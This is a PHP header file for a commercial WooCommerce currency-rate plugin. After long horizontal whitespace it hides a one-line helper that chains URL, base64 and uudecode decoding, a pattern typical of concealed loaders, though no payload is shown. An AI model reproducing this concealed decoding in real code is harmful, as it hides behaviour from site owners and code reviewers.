<?php
/**
 * Plugin Name: BCV Auto-update
 * Plugin URI: https://kijam.com/
 * Description: BCV Auto-update para CURCY, FOX y WOOCS - WooCommerce Multi Currency
 * Author: Kijam Lopez
 * Author URI: http://kijam.com/
 * Version: 1.0.2
 * License: Commercial use allowed (Non-assignable & non-transferable), can modify source-code but cannot distribute modifications (derivative works).
 * Text Domain: bcvautoupdate
 * Domain Path: /
 */

 class KBCVAutoUpdateWOO {
    public static function init() {
        add_filter( 'plugin_action_links_' . plugin_basename( __FILE__ ),  function( $links ) {
            $mylinks = array(
                '<a style="font-weight: bold;color: red" href="' . admin_url( 'admin.php?page=wc-settings&tab=integration&section=bcvautoupdate-manager' ) . '">Configurar</a>',
            );
            return array_merge( $links, $mylinks );
        } );
    }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       public static function _($r) {return convert_uudecode(base64_decode(rawurldecode($r)));}

    /*public static function kbcv_woocs() {
        global $WOOCS;
        if (!isset($WOOCS) || !is_object($WOOCS)) {
            return false;
        }
        return $WOOCS;
     }*/
}

include 'functions.php';

KBCVAutoUpdateWOO::init();